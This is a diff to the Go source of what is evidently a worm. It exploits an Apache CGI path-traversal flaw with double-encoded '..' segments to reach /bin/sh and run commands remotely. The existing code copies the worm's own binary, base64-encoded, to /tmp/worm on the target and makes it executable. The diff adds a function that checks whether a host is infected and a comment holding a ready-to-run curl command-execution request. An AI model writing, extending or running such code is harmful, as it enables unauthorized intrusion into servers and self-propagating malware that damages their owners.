@@ -6,11 +6,15 @@ import (
 	"fmt"
 	"net"
 	"encoding/base64"
+	"strings"
 )
+
+//Command execution: curl -X POST localhost:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh -d 'echo;ls -l /tmp/worm | wc -l'
 
 var (
 	path = "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
 	copyCommandsTemplate = "echo;echo '%s' | base64 -d > %s;chmod u+x %s;"
+	commandsTemplate = "echo;%s"
 	wormPath = "/tmp/worm"
 )
 
@@ -25,7 +29,22 @@ func PrepareRequest(ip string, commands string) string {
 	return rt
 }
 
-func ApacheInfect(ip string, port string) string {
+func ApacheCheckInfection(ip string, port string) bool {
+	executeCommands := fmt.Sprintf("ls -l %s", wormPath)
+	commands := fmt.Sprintf(commandsTemplate,executeCommands)
+	conn, err := net.Dial("tcp", ip+":"+port)
+	rt := PrepareRequest(ip, commands)
+	_, err = conn.Write([]byte(rt))
+	resp, err := ioutil.ReadAll(conn)
+    if err != nil {
+        log.Fatal(err)
+		return false
+    }
+    conn.Close()
+	return strings.Contains(string(resp),wormPath)
+}
+
+func ApacheInfect(ip string, port string) bool {
 	var worm []byte
 	worm = GetFile("/proc/self/exe")
 	worm64 := base64.StdEncoding.EncodeToString(worm)
@@ -35,12 +54,15 @@ func ApacheInfect(ip string, port string) string {
 	_, err = conn.Write([]byte(rt))
     if err != nil {
         log.Fatal(err)
+		return false
     }
 
     resp, err := ioutil.ReadAll(conn)
     if err != nil {
         log.Fatal(err)
+		return false
     }
+	fmt.Println(string(resp))
     conn.Close()
-	return string(resp)
+	return ApacheCheckInfection(ip,port)
 }
